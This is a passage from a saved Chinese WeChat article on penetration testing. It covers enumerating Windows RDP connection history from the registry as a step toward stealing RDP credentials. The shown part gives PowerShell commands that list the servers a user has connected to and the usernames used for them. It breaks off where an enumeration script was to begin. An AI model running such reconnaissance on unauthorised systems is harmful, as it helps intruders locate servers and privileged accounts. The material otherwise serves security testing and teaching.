<html>
<head>
<title>内网渗透｜获取远程桌面连接记录与RDP凭据</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
内网渗透｜获取远程桌面连接记录与RDP凭据
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                <span id="copyright_logo" class="rich_media_meta icon_appmsg_tag appmsg_title_tag weui-wa-hotarea">原创</span>
                                                                                            <span class="rich_media_meta rich_media_meta_text">
                                                                    WHOAMI
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2021-08-03</em>
                </div>

                
                                                                                                                                                                                                                        <div id="js_tags"  class="article-tag__list" data-len="3">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                                                                <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=1983486452080410628#wechat_redirect" data-tag_id="" data-album_id="1983486452080410628"  data-tag_source="4">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>远程桌面</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>3</span>
                                                                            </div>
                                                                    <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=1964742262458777602#wechat_redirect" data-tag_id="" data-album_id="1964742262458777602"  data-tag_source="4">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>渗透测试</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>12</span>
                                                                            </div>
                                                                    <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=1928066062302937090#wechat_redirect" data-tag_id="" data-album_id="1928066062302937090"  data-tag_source="4">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>内网渗透</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>20</span>
                                                                            </div>
                                                                                    </div>
                                    </div><div id="weixin_content"><figure style="margin-right: 8px;margin-bottom: 1.5em;margin-left: 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;" data-mpa-powered-by="yiban.io"><img data-ratio="0.6666666666666666" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/1_3YDJ7oWibRnq6BgzoOaaJiaJKApY5w.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPBd6DFXszRmqn0rUVkmLOU3biaica3YDJ7oWibRnq6BgzoOaaJiaJKApY5w/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1200" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">前言</a></h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">Windows 远程桌面是用于管理 Windows 服务器的最广泛使用的工具之一。管理员喜欢使用远程桌面，攻击者也喜欢使用（狗头）。在之前的文章中我们已经介绍了很多攻击远程桌面的方法，本篇文章我们继续来探究。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">在渗透测试中，RDP 远程桌面连接的历史记录不可忽视，根据历史连接记录我们往往能够定位出关键的服务器。并且，当我们发现了某台主机上存在远程桌面的连接记录，我们还可以想办法获取其远程桌面登录历史的连接凭据。用于登录 RDP 远程桌面会话的凭据通常具有特权，这使它们成为红队操作期间的完美目标。</p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">获取 RDP 远程桌面连接记录</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">获取 RDP 远程桌面的连接记录我们可以通过枚举注册表完成，但是如果想要获得所有用户的历史记录，需要逐个获得用户的 NTUSER.DAT 文件，通过注册表加载配置单元，导入用户配置信息，再进行枚举才能够实现。</p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">导出当前用户的历史记录</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">可以通过枚举以下注册表键值查看当前用户的历史记录：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">HKEY_CURRENT_USER\Software\Microsoft\Terminal </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Server</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Client</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\Servers</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如下图所示，每个注册表项保存连接的服务器地址，其中的键值&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">UsernameHint</code>&nbsp;对应登录用户名：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6067146282973621" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/2_BDhXE4zKDQ3FQ1lkic1aiauZeBKpsg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEP5XYV4hXOk7iczeVYtIUYI89OwtqBDhXE4zKDQ3FQ1lkic1aiauZeBKpsg/640?wx_fmt=png'" data-type="png" data-w="1251" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210524084553447</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">看也可以通过 PowerShell 命令行来实现，首先通过以下命令枚举指定注册表项下所有的的子项，即当前用户所连接过的所有的主机名：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="powershell" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dir </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Name</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.0875995449374289" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/3_7y3cwOiaytEb4H1DUMhRUWjbrCicnA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPrv3WAP8Xu5IH33m0mA60BXBgxH7y3cwOiaytEb4H1DUMhRUWjbrCicnA/640?wx_fmt=png'" data-type="png" data-w="879" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210524093321775</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后使用以下命令查询指定注册表项的注册表键值，即查看连接所使用的用户名：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="powershell" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ItemProperty</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Path</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\192.168.93.30"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">UsernameHint</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.14953271028037382" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/4_lxRqujC8jMQ96t8orvB4EoeuCTibww.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPWcFdmSwpbeuE4Av1wm9HNHfxXlxRqujC8jMQ96t8orvB4EoeuCTibww/640?wx_fmt=png'" data-type="png" data-w="963" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210524093431912</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">下面给出一个三好学生写的枚举脚本：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="powershell" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" 